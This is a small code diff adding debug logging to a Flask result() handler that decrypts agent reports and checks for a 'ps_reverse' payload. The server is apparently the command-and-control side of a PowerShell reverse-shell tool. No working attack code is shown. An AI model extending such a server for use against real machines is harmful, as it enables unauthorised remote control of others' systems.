@@ -331,6 +331,7 @@ def result():
             print(f"[!] Fallback JSON parse failed: {ex}")
             return jsonify({"error": "Unable to decrypt result"}), 400
 
+    print(f"[DEBUG] Parsed result: {json.dumps(data, indent=2)}")
 
     hostname = data.get("hostname")
     command = data.get("command")
@@ -402,6 +403,8 @@ def result():
     payload = data.get("payload", "").lower()
     print(f"[DEBUG] Host: {hostname}, Payload: {payload}")
     is_ps_agent = payload == "ps_reverse"
+
+    print(f"[EMIT] ps_output -> Host: {hostname}")
 
 
     if is_ps_agent:
